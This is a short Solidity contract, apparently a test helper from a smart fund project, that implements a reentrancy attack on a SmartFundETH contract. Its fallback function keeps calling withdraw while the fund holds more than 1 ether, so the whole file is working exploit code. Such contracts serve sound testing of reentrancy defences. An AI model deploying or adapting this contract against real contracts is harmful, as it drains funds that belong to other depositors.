import "../../contracts/core/interfaces/SmartFundETHInterface.sol";


contract ReEntrancyFundAtack {
    SmartFundETHInterface public fund;
    address public fundAddress;

    constructor(address _fund)public{
        fund = SmartFundETHInterface(_fund);
        fundAddress = _fund;
    }

    // pay to contract
    function pay() public payable{}

    // deposit to fund from contract
    function deposit(uint256 _amount)public{
        fund.deposit.value(_amount)();
    }


    function startAtack()public{
        fund.withdraw(0);
    }

    // loop
    function() public payable {
        if(fundAddress.balance > 1 ether){
            fund.withdraw(0);
        }
    }
}
